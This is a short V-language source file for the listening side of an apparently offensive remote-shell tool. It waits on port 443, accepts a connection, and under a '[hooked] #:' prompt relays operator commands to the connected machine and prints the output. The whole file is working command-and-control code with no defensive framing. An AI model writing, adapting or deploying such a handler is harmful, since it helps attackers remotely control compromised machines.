import net
import os

fn main() {
	
    mut recvdcmd := []byte{len: 3072}
    listen_on_port := 443
	println("Not Yet Connected ...")
	listner := net.listen_tcp(listen_on_port) or {
		panic(err)
	}
	conn := listner.accept() or  {
		panic(err)
	}
	for {
		print("[hooked] #: ")
		reader := os.input("")
		command:= reader
		if command == "bye" {
			conn.write_str(command)
			conn.close()			
		} else {
			conn.write_str(command)
			nbytes := conn.read(mut recvdcmd) or {
                panic(err)
            }
			mut result := recvdcmd[0..nbytes].bytestr()

			println(result)

		}

	}

}
